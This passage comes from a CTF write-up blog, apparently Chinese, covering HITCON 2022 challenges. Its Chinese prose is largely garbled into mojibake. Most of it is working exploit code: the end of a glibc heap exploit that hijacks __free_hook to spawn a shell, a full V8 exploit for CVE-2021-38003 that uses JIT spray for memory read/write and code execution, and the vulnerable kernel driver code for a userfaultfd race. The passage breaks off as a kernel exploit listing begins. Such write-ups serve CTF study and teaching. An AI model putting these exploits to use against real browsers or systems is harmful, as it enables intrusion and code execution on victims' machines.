unsortedbin: C1-A ,   A-&gt;BK = C1</span><br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)  <span class="hljs-comment"># 5 partial overwrite bk    A-&gt;bk = p</span><br>add(<span class="hljs-number">0x418</span>)           <span class="hljs-comment"># 9 C1</span><br><br><span class="hljs-comment"># step4 use ub to set bk-&gt;fd</span><br>dele(<span class="hljs-number">9</span>)           <span class="hljs-comment"># C1</span><br>dele(<span class="hljs-number">6</span>)           <span class="hljs-comment"># D=P-&gt;bk</span><br><span class="hljs-comment"># ub-D-C1    D-&gt;FD = C1</span><br>dele(<span class="hljs-number">8</span>)           <span class="hljs-comment"># merge D with H, preserve D-&gt;fd </span><br>add(<span class="hljs-number">0x500</span>-<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x240</span>,<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x240</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x8</span> + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&quot;\x00&quot;</span>) <span class="hljs-comment"># 6 H1. bk-&gt;fd = p, partial write \x00</span><br><br>add(<span class="hljs-number">0x3b0</span>)                  <span class="hljs-comment"># 8   recovery</span><br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x208</span>)        <span class="hljs-comment"># 9   Victim 1 to leak, reamember writing sth. for leak</span><br>add(<span class="hljs-number">0x208</span>)                  <span class="hljs-comment"># 11  Victim 2 to hijack</span><br><br>dele(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x308</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x240</span>,<span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x308</span> - <span class="hljs-number">0x240</span> - <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x750</span>) + <span class="hljs-string">&quot;\x00&quot;</span>) <span class="hljs-comment"># 7 Trigger</span><br>dele(<span class="hljs-number">6</span>)<br><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment"># 6</span><br>download(<span class="hljs-number">9</span>)<br>sleep(<span class="hljs-number">0.5</span>)   <span class="hljs-comment"># Ensure get real data</span><br>ru(<span class="hljs-string">&quot;\xc0\x12&quot;</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">0x12</span>)<br>rc(<span class="hljs-number">0x10</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment"># Useless</span><br>libc_leak = uu64(rcv_leak(rc(<span class="hljs-number">0x40</span>)))<br>libc_base = libc_leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><br>dele(<span class="hljs-number">1</span>)     <span class="hljs-comment"># For Tcache Count Check</span><br>dele(<span class="hljs-number">11</span>)    <span class="hljs-comment"># Free Victim 2</span><br>add(<span class="hljs-number">0x1f8</span>)  <span class="hljs-comment"># 1 Make next malloc can overwrite Victim 2&#x27;s next pointer</span><br>add(<span class="hljs-number">0x8</span>,p64(libc.sym.__free_hook - <span class="hljs-number">8</span>))   <span class="hljs-comment"># 11 Hijack victim to &amp;__free_hook - 8</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment"># 12 </span><br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&quot;/bin/sh\0&quot;</span> + p64(libc.sym.system)) <span class="hljs-comment"># 13</span><br>dele(<span class="hljs-number">13</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212132314773.png" alt="image-20221213230729496"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hitcon2022 éƒ¨åˆ†é¢˜è§£</title>
    <link href="/posts/a60d8e49.html"/>
    <url>/posts/a60d8e49.html</url>
    
    <content type="html"><![CDATA[<p>å‡†å¤‡å­¦ä¹ å¤ç°ä¸€ä¸‹ Browser å’Œ Kernel çš„éƒ¨åˆ†ï¼Œå½“ç„¶ Mojo ç›®å‰è™½ç„¶ä¼šæ‰“äº†è¿˜æ˜¯ä¸çŸ¥é“åŸç† qwqï¼Œåé¢å†å†™ã€‚</p><p>å…¶ä»–å‡ºé¢˜äºº/é€‰æ‰‹çš„ wpï¼š</p><p>Browser: <a href="https://bruce30262.github.io/hitcon-ctf-2022-fourchain-browser/">https://bruce30262.github.io/hitcon-ctf-2022-fourchain-browser/</a></p><p>Hypervisor: <a href="https://bruce30262.github.io/hitcon-ctf-2022-fourchain-hypervisor/">https://bruce30262.github.io/hitcon-ctf-2022-fourchain-hypervisor/</a></p><p>Fourchain - Hole <a href="https://chovid99.github.io/posts/hitcon-ctf-2022/">https://chovid99.github.io/posts/hitcon-ctf-2022/</a></p><p>Eaas <a href="https://github.com/lys0829/My-CTF-Challenges/tree/master/HITCONCTF-2022">https://github.com/lys0829/My-CTF-Challenges/tree/master/HITCONCTF-2022</a></p><p>wtfshell <a href="https://bbs.pediy.com/thread-275376.htm">https://bbs.pediy.com/thread-275376.htm</a></p><h2 id="â›“ï¸-Fourchain-Hole"><a class="header-anchor" href="#â›“ï¸-Fourchain-Hole">Â¶</a>â›“ï¸ Fourchain - Hole</h2><p>ç®€å•çš„ V8 é¢˜ï¼Œæ˜¯æˆ‘æ¯”èµ›çš„æ—¶å€™å”¯ä¸€åšå‡ºæ¥çš„é¢˜ ä¸å¥½æ„æ€æœ‰ç‚¹èœorzï¼Œæœ€åä¹Ÿæ˜¯è¢«æ‰“æˆäº†ç­¾åˆ°é¢˜ã€‚ä¸å¤ä¹ äº†ç†¬å¤§å¤œæŠ„ 2019 å¸ˆå‚…çš„<a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">ä½œä¸š</a>æ‰æŠ¢åˆ°çš„ä¸‰è¡€â•°ï¼ˆâ€µâ–¡â€²ï¼‰â•¯ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212011731875.png" alt="image-20221130175626313"></p><p>åŸ <strong>CVE-2021-38003</strong> POC å’Œ EXP æ€è·¯</p><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1263462">https://bugs.chromium.org/p/chromium/issues/detail?id=1263462</a></li><li><a href="https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078">https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078</a></li><li><a href="https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/">https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/</a></li></ul><p>v8 â€œå †æ²™ç›’â€œ ä»‹ç»å’Œç»•è¿‡</p><ul><li><p><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit</a></p></li><li><p><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a></p></li><li><p><a href="https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/">https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/</a></p></li></ul><p>ç›´æ¥ä¸€æçš„æ˜¯ï¼Œä¿®æ”¹å…¨å±€å˜é‡çš„é‚£ä¸ªæ€è·¯ç°åœ¨å·²ç»ä¸è¡Œäº†ï¼ˆ<a href="https://chromium-review.googlesource.com/c/v8/v8/+/3845636">è¿™ä¸ªpatch</a>ï¼‰ï¼Œåªèƒ½å‚è€ƒ 2019 å¸ˆå‚…çš„ <code>JIT SPRAY</code> æ€è·¯äº†ã€‚</p><h3 id="POC"><a class="header-anchor" href="#POC">Â¶</a>POC</h3><p>è·å– length ä¸º -1 çš„ map</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = [];<br><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(a.<span class="hljs-title function_">hole</span>(),<span class="hljs-number">1</span>);<br><br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>);<br><br>%<span class="hljs-title class_">DebugPrint</span>(map);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><h3 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br> <br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoi</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  f64[<span class="hljs-number">0</span>] = f;<br>  <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itof</span>(<span class="hljs-params">i</span>)<br>&#123;<br>  bigUint64[<span class="hljs-number">0</span>] = i;<br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ftoh</span>(<span class="hljs-params">f</span>)<br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">itoh</span>(<span class="hljs-title function_">ftoi</span>(f));<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">itoh</span>(<span class="hljs-params">i</span>)&#123;<br>  <span class="hljs-keyword">var</span> pad = <span class="hljs-number">16</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">BigInt</span>(i) &gt;&gt; <span class="hljs-number">32n</span> == <span class="hljs-number">0</span>)&#123;<br>    pad = <span class="hljs-number">8</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(pad, <span class="hljs-string">&quot;0&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">lgf</span>(<span class="hljs-params">label, val</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(label + <span class="hljs-string">&quot;: 0x&quot;</span> + val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">foo</span> = (<span class="hljs-params"></span>)=&gt;<br>&#123;<br><span class="hljs-keyword">return</span> [<br>        <span class="hljs-number">1.0</span>,<br><span class="hljs-number">1.95538254221075331056310651818E-246</span>,<br><span class="hljs-number">1.95606125582421466942709801013E-246</span>,<br><span class="hljs-number">1.99957147195425773436923756715E-246</span>,<br><span class="hljs-number">1.95337673326740932133292175341E-246</span>,<br><span class="hljs-number">2.63486047652296056448306022844E-284</span>];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10000</span>; i++) &#123;<br><span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<span class="hljs-title function_">foo</span>();<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">f</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-number">123</span>;<br><span class="hljs-comment">// new ArrayBuffer(0x7fe00000);</span><br><span class="hljs-keyword">var</span> a = [];<br><span class="hljs-keyword">var</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">var</span> foo_arr = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> obj_arr = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">var</span> f_arr = <span class="hljs-literal">null</span>;<br><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(a.<span class="hljs-title function_">hole</span>(),<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(a.<span class="hljs-title function_">hole</span>());<br>map.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>);<br>foo_arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">1.1</span>, <span class="hljs-number">1.1</span>);<span class="hljs-comment">//1.1=3ff199999999999a </span><br><span class="hljs-keyword">const</span> o = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">0x1337</span>, <span class="hljs-attr">a</span>:foo, <span class="hljs-attr">b</span>:f&#125;;<br><span class="hljs-keyword">const</span> ua = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(<span class="hljs-number">2</span>);<br>ua[<span class="hljs-number">0</span>]=<span class="hljs-number">0x23332333</span>;<br><span class="hljs-comment">//%DebugPrint(map);</span><br><span class="hljs-comment">//%DebugPrint(foo_arr);</span><br><span class="hljs-comment">//%SystemBreak();</span><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">0x10</span>, -<span class="hljs-number">1</span>);<br>map.<span class="hljs-title function_">set</span>(foo_arr, <span class="hljs-number">0xffff</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">readOff</span>(<span class="hljs-params">off</span>)<br>&#123;<br>foo_arr[<span class="hljs-number">0x28</span>] = <span class="hljs-title function_">itof</span>(off+<span class="hljs-number">16n</span>);<br><span class="hljs-keyword">return</span> ua[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeOff</span>(<span class="hljs-params">off, val</span>)<br>&#123;<br>foo_arr[<span class="hljs-number">0x28</span>] = <span class="hljs-title function_">itof</span>(off+<span class="hljs-number">16n</span>);<br>ua[<span class="hljs-number">0</span>] = val;<br>&#125;<br><span class="hljs-keyword">var</span> off_foo = <span class="hljs-title function_">ftoi</span>(foo_arr[<span class="hljs-number">7</span>])&amp;<span class="hljs-number">0xffffffffn</span>;<br><span class="hljs-keyword">var</span> off_foo_code = <span class="hljs-title function_">readOff</span>(off_foo);<br><span class="hljs-keyword">var</span> jit_off = <span class="hljs-title function_">readOff</span>(<span class="hljs-title class_">BigInt</span>(off_foo_code)-<span class="hljs-number">0x10n</span>+<span class="hljs-number">4n</span>);<br><br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;off_foo&quot;</span>,off_foo);<br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;off_foo_code&quot;</span>,off_foo_code);<br><span class="hljs-title function_">lgf</span>(<span class="hljs-string">&quot;jit_off&quot;</span>,jit_off);<br><br><span class="hljs-comment">//%DebugPrint(foo);</span><br><br><span class="hljs-comment">//%SystemBreak();</span><br><span class="hljs-title function_">writeOff</span>(<span class="hljs-title class_">BigInt</span>(off_foo_code)-<span class="hljs-number">0x10n</span>+<span class="hljs-number">4n</span>,jit_off+<span class="hljs-number">0x7c</span>);<br><span class="hljs-comment">//%SystemBreak();</span><br><span class="hljs-title function_">foo</span>();<br><span class="hljs-comment">//%SystemBreak();</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211301825317.png" alt="Untitled"></p><h2 id="â›“ï¸-Fourchain-Sandbox"><a class="header-anchor" href="#â›“ï¸-Fourchain-Sandbox">Â¶</a>â›“ï¸ Fourchain - Sandbox</h2><p>ç¬¬ä¸€æ¬¡æ¥è§¦ Mojo é¢˜ï¼Œçœ‹åˆ°ä»£ç æ¯”è¾ƒç®€å•å°±ç¡¬é’¢äº†ï¼Œç»“æœä¸å‡ºæ„å¤–æ˜¯æ²¡åšå‡ºæ¥ orzã€‚</p><p>ç°åœ¨å·²ç»ä¼šæ‰“äº† =ã€‚= ç­‰è¡¥ç‚¹åŸºç¡€å†å†™.jpg</p><h2 id="â›“ï¸-Fourchain-Kernel"><a class="header-anchor" href="#â›“ï¸-Fourchain-Kernel">Â¶</a>â›“ï¸ Fourchain - Kernel</h2><p>æ—©çŸ¥é“å…ˆçœ‹ Kernel äº†ï¼Œéš¾åº¦ä¸é«˜ &lt;( ï¿£^ï¿£)</p><h3 id="è§£æ³•ä¸€ï¼ˆHijack-node-to-AAR-AAWï¼‰"><a class="header-anchor" href="#è§£æ³•ä¸€ï¼ˆHijack-node-to-AAR-AAWï¼‰">Â¶</a>è§£æ³•ä¸€ï¼ˆHijack node to AAR/AAWï¼‰</h3><p>å‚è€ƒ <a href="https://twitter.com/ptrYudai">ptr-yudai</a> å¸ˆå‚…åœ¨ Discord æœåŠ¡å™¨ä¸Šå‘çš„ Exp è¿›è¡Œå¤ç°ã€‚</p><p>è¿™é¢˜ä¸‹é¢çš„è§£æ³•æ˜¯<strong>éé¢„æœŸ</strong>ï¼ˆ å‡ºé¢˜äººèµ›åè¯´ä¸è¯¥æŠŠNodeæ”¾å †ä¸Š XDï¼‰ï¼Œç›´æ¥æ—¥ <code>struct node</code> è¾¾åˆ°ä»»æ„è¯»/å†™äº†ï¼Œç†è§£ UserFaultFd åï¼Œæ‰‹æ³•å…¶å®å°±å’Œæˆ‘ä»¬ç”¨æˆ·æ€çš„å·®ä¸å¤šã€‚</p><p>åœ¨ <code>IO_ADD</code> åˆ†æ”¯æˆ‘ä»¬åˆ†é…äº† <code>sizeof(struct node)</code> å¤§å°çš„ node ç»“æ„ä½“ï¼Œç„¶ååˆ†é…ä¸€ä¸ªç”¨æˆ·å¯æ§å¤§å°çš„ <code>data</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">table</span>[0<span class="hljs-title">x10</span>];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> key;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">char</span>* addr;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_ADD:<br>table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>table[data.idx]-&gt;size = data.size;<br>get_random_bytes(&amp;table[data.idx]-&gt;key,<span class="hljs-keyword">sizeof</span>(table[data.idx]-&gt;key));<br>addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>IO_DEL</code> åˆ†æ”¯ä¾æ¬¡ free æ‰ <code>data</code> å’Œ <code>node</code> ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_DEL:<br>&#123;<br><span class="hljs-keyword">if</span>( table[data.idx] )&#123;<br>addr = table[data.idx]-&gt;addr ^ table[data.idx]-&gt;key;<br>kfree((<span class="hljs-type">void</span>*)addr);<br>kfree(table[data.idx]);<br>table[data.idx] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ç¬¬ä¸€æ¬¡çš„ data å¤§å°ä¹Ÿæ˜¯ <code>sizeof(struct node)</code> ï¼Œç”¨ <code>UserFaultfd</code> åœ¨ copy_from_user è¿™é‡Œå¡ä½ã€‚</p></li><li><p>éšåæ§åˆ¶ data çš„å¤§å°ä¸ <code>sizeof(struct node)</code> ä¸åŒï¼Œåœ¨ç¼ºé¡µå¤„ç†çš„è¿›ç¨‹é‡Œé¢æ‰§è¡Œä¸€æ¬¡ <code>IO_DEL</code>ï¼Œä¿©æ¬¡ <code>IO_ADD</code> å°±èƒ½è¾¾åˆ°<strong>ä½¿ UserFaultfd å°†è¦ä¿®æ”¹çš„ data åˆ†é…ä¸ºä¸€ä¸ªå¦ä¸€ä¸ª table[idx] çš„ node ç»“æ„ä½“</strong>çš„æ•ˆæœã€‚</p></li><li><p>æœ€åå”¤é†’è¿›ç¨‹ç»§ç»­æ‰§è¡Œ <code>copy_from_user</code> å’Œ <code>memcpy</code> ä¼ªé€  node ç»“æ„ä½“è¿›è¡Œ ARR/ARWã€‚</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">kfree((<span class="hljs-type">void</span>*)addr_idx0);<br>kfree(table[data_idx0]);<br>           table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br>           table[data.idx] = (<span class="hljs-keyword">struct</span> node*)kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> node),GFP_KERNEL);<br>addr = (<span class="hljs-type">uint64_t</span>)kzalloc(data.size,GFP_KERNEL);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IO_EDIT:<br>&#123;<br><span class="hljs-keyword">if</span>( table[data.idx] )&#123;<br>addr = table[data.idx]-&gt;addr ^ table[data.idx]-&gt;key;<br>size = table[data.idx]-&gt;size &amp; <span class="hljs-number">0x1ff</span>;<br>                  <span class="hljs-comment">// UserFaultfd HERE!</span><br>ret = copy_from_user(buf, (<span class="hljs-type">void</span> __user *)data.addr, size);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i*<span class="hljs-number">8</span> &lt; size; i++)<br>buf[i]^= table[data.idx]-&gt;key;<br><span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span>*)addr,buf,size);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»Šå¤©åƒé¥±ç€æ’‘ç€äº†ğŸ‘¦ğŸ»ï¼Œç»™å¤§ä¼™ç”»ä¸ªå›¾å—·ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202212080129732.png" alt="hitcon-kernel"></p><p>Exp åŠ äº†ç‚¹æ³¨é‡Š orzï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 